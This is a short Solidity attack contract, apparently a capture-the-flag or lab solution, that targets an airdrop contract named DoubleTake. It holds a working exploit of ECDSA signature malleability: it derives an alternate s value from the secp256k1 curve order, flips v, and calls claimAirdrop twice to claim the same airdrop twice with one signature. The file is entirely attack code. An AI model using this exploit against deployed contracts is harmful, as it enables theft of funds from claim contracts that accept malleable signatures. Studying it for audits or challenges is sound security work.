// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "../DoubleTake.sol";

contract AttackContract {
    DoubleTake public target;
    address public constant SIGNER = 0x5Cd705F118aD9357Ac8330f48AdA7A60F3efc200;
    uint256 public constant CURVE_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    constructor(address _target) {
        target = DoubleTake(_target);
    }

    function exploit(
        address user, 
        uint256 amount, 
        bytes32 r, 
        bytes32 s
    ) external {
        // Calculate s2 using curve order
        bytes32 s2 = bytes32(CURVE_ORDER - uint256(s));

        // Claim with alternate signatures
        target.claimAirdrop(user, amount, 27, r, s2);
        target.claimAirdrop(user, amount, 28, r, s);
    }
}